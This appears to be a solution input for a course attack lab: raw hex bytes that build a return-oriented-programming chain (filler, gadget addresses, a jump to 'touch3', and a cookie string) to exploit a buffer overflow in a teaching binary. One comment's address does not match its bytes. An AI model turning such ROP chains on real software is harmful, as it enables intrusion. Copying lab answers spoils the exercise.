23 33 23 33 23 33 23 33
23 33 23 33 23 33 23 33
23 33 23 33 23 33 23 33
23 33 23 33 23 33 23 33
23 33 23 33 23 33 23 33
06 1a 40 00 00 00 00 00		/* jump to 0x4019ab (movq %rsp,%rax) */
d8 19 40 00 00 00 00 00		/* jump to 0x4019d8 (add $0x37,%al) */
a2 19 40 00 00 00 00 00		/* jump to 0x4019a2 (movq %rax,%rdi) */
fa 18 40 00 00 00 00 00     /* jump to touch3 */
23 33 23 33 23 33 23 33
23 33 23 33 23 33 23 33
23 33 23 33 23 33 23 33
23 33 23 33 23 33 23 35 
39 62 39 39 37 66 61 00		/* string of the cookie */
